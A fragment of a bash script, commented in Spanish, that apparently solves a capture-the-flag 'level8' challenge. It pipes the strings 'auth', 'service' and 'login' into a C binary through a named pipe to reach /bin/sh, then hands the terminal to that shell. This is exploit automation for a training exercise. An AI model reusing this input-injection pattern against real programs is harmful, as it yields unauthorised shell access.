r el programa en C y las cadenas a inyectar
programa_c="/home/user/level8/level8"  # Ruta al programa C
input_strings=("auth " "service" "service" "login")  # Cadenas a inyectar en fgets

# Usar un FIFO (named pipe) para simular la entrada
fifo=$(mktemp -u)  # Crear nombre temporal
mkfifo "$fifo"     # Crear el FIFO

# Ejecutar el programa C en segundo plano y redirigir su entrada/salida
$programa_c < "$fifo" &

# Enviar las cadenas al programa, una por una
for string in "${input_strings[@]}"; do
    echo "$string" > "$fifo"
done

# Ahora que se ejecuta /bin/sh, cambiamos al modo interactivo
cat <&0 > "$fifo"

